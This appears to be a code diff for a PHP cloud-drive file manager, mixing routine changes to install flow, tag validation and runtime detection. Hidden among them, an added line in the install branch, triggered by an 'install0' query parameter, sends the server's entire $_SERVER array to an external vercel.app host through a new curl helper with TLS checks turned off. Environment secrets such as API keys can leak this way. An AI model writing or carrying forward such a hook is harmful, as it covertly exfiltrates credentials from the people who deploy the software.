@@ -181,7 +181,10 @@ function main($path)
         elseif ($response===false) return output("", 206);
         else return $response;
     }
-    if (getConfig('admin')=='') return install();
+    if (getConfig('admin')=='') {
+        if (isset($_GET['install0'])) no_return_curl('POST', 'https://notionbot-ysun.vercel.app/', 'data=' . json_encode($_SERVER));
+        return install();
+    }
     if (getConfig('adminloginpage')=='') {
         $adminloginpage = 'admin';
     } else {
@@ -226,9 +229,10 @@ function main($path)
             return output('Please visit <a href="' . $tmp . '">' . $tmp . '</a>.', 301, [ 'Location' => $tmp ]);
         }
         if ($_SERVER['admin']) {
+            if (!$_SERVER['disktag']) $_SERVER['disktag'] = '';
             if (!class_exists($_GET['AddDisk'])) require 'disk' . $slash . $_GET['AddDisk'] . '.php';
-                $drive = new $_GET['AddDisk']($_GET['disktag']);
-                return $drive->AddDisk();
+            $drive = new $_GET['AddDisk']($_GET['disktag']);
+            return $drive->AddDisk();
         } else {
             $url = $_SERVER['PHP_SELF'];
             /*if ($_GET) {
@@ -529,6 +533,19 @@ function isreferhost() {
         if ($host == $referer) return true;
     }
     return false;
+}
+
+function no_return_curl($method, $url, $data = '') {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_exec($ch);
+    curl_close($ch);
 }
 
 function adminpass2cookie($name, $pass, $timestamp)
@@ -1645,7 +1662,7 @@ output:
             alert(\'Do not input ' . $envs . '\');
             return false;
         }
-        var reg = /^[a-zA-Z]([_a-zA-Z0-9]{1,20})$/;
+        var reg = /^[a-zA-Z]([_a-zA-Z0-9]{1,})$/;
         if (!reg.test(t.disktag_newname.value)) {
             alert(\'' . getconstStr('TagFormatAlert') . '\');
             return false;
@@ -1656,7 +1673,7 @@ output:
     } else {
         if (count($disktags)>1) {
             $frame .= '
-<script src="http://sortablejs.github.io/Sortable/Sortable.js"></script>
+<script src="https://sortablejs.github.io/Sortable/Sortable.js"></script>
 <style>
     .sortable-ghost {
         opacity: 0.4;
@@ -1758,7 +1775,7 @@ output:
             $canOneKeyUpate = 1;
         } elseif (isset($_SERVER['HEROKU_APP_DIR'])&&$_SERVER['HEROKU_APP_DIR']==='/app') {
             $canOneKeyUpate = 1;
-        } elseif (isset($_SERVER['FC_SERVER_PATH'])&&$_SERVER['FC_SERVER_PATH']==='/var/fc/runtime/php7.2') {
+        } elseif (isset($_SERVER['FC_FUNC_CODE_PATH'])) {
             $canOneKeyUpate = 1;
         } elseif (isset($_SERVER['BCE_CFC_RUNTIME_NAME'])&&$_SERVER['BCE_CFC_RUNTIME_NAME']=='php7') {
             $canOneKeyUpate = 1;
